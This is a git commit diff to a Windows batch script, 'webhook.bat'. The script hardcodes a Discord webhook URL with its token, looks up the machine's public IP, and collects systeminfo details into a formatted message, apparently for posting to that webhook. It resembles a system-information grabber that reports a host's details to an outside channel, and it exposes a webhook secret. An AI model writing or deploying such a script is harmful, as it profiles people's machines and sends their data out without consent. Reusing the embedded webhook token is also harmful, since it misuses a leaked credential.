8d0b31a7d3f2c921c1ee9b727c4a477536e4dc30
KRNXMID <krnxmid@gmail.com>
2024-11-11 15:41:17 +0530

    Update webhook.bat

--- webhook.bat
+++ webhook.bat
@@ -3,16 +3,20 @@ setlocal enabledelayedexpansion
 
 set WEBHOOK_URL="https://discord.com/api/webhooks/1305468665814319165/rB4sM8dYCdqLqqXzqb9NJwnODWp5U7hNPS7dOSNJX8qRbgHeC5qg8sO5HHkIx1pK6jov"
 
-:: Get the public IP address
-for /f "tokens=*" %%a in ('curl -s https://ifconfig.me') do set PUBLIC_IP=%%a
+:: Get the public IPv4 address
+for /f "tokens=*" %%a in ('curl -4 -s https://ifconfig.me') do set PUBLIC_IP=%%a
 
 :: Initialize variable to store system info
 set INFO=**Public IP:** !PUBLIC_IP!^
 
-
-:: Capture only relevant information with new lines and bold labels
-for /f "tokens=1,*" %%a in ('systeminfo ^| findstr /i "OS OSName System Manufacturer Total Physical Memory Name Manufacturer Model Version Locale"') do (
-    set INFO=!INFO!**%%a:** %%b^
+:: Capture relevant information with new lines and bold labels
+for /f "tokens=1,* delims=:" %%a in ('systeminfo ^| findstr /i /c:"OS " /c:"System " /c:"Total Physical Memory" /c:"Available Physical Memory" /c:"Virtual Memory" /c:"Manufacturer" /c:"Model" /c:"Locale" /c:"Boot Time"') do (
+    set KEY=%%a
+    set VALUE=%%b
+    set KEY=!KEY: =!
+    set VALUE=!VALUE: =!
+    set INFO=!INFO!^
+**!KEY!:** !VALUE!^
 
 
 )
